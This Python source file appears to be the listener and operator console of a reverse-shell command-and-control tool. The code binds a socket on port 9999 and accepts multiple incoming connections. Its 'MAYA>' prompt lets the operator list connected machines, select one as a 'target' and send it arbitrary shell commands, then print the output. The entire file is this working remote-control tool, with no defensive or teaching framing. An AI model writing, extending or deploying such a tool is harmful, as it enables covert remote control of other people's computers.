import socket
import sys
import threading
import time
from queue import Queue


# Constants
NUMBER_OF_THREADS = 2
NUMBER_OF_JOBS = [1, 2]










queue = Queue()
all_address = []
all_connection = []

# Creating a  function to connect two sockets.
def create_socket():
    try:
        global host, port, s
        host = "servers ip" 
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket error: " + str(msg))











# hear i am trying to bind the port with ip 
def binding_socket():

    global host, port, s

    print(f"Socket is binding for the port {str(port)}")

    while True:

        try:
            s.bind((host, port))
            s.listen(5)
            break

        except socket.error as msg:

            print(f"Error while binding the sockets: {str(msg)}")
            time.sleep(1)







# Accepting request from clients

def accepting_connection():
    for con in all_connection:
        con.close()

    del all_connection[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(True)
            all_connection.append(conn)
            all_address.append(address)
            print(f"Connected to {address[0]}")
        except:
            print("Some error occurred!")









# Creating the Maya shell
def start_maya_shell():
    while True:
        cmd = input("MAYA> ")

        if cmd.lower() == "list":
            list_connection()

        elif cmd.lower() == "exit":
            break

        elif "select" in cmd.lower():
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)

        else:
            print("Undefined command!")








# This function checks if the connection is active or not
def list_connection():
    results = ""
    for i, connection in enumerate(all_connection):
        try:
            connection.send(str.encode(" "))  
            connection.recv(30000)
        except:
            del all_connection[i]
            del all_address[i]
            continue
        results += f"{str(i)} {str(all_address[i][0])} {all_address[i][1]}\n"
    print("______________clients_______________\n" + results)











def get_target(cmd):
    try:
        target = cmd.lower().replace("select", "").strip()
        target = int(target)
        conn = all_connection[target]
        print(f"You are now connected to {str(all_address[target][0])}")
        print(f"{str(all_address[target][0])}> ", end="")
        return conn
    except:
        print("No target available")
        return None












def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd.lower() == "quit":
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "utf-8")
                print(client_response, end="")
        except:
            print("Some error occurred!")
            break


# from hear threding will start 
# Creating the workers
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def create_job():
    for x in NUMBER_OF_JOBS:
        queue.put(x)
    queue.join()

# Do the jobs in the queue
def work():
    global queue
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            binding_socket()
            accepting_connection()
        if x == 2:
            start_maya_shell()
        queue.task_done()

create_workers()
create_job()
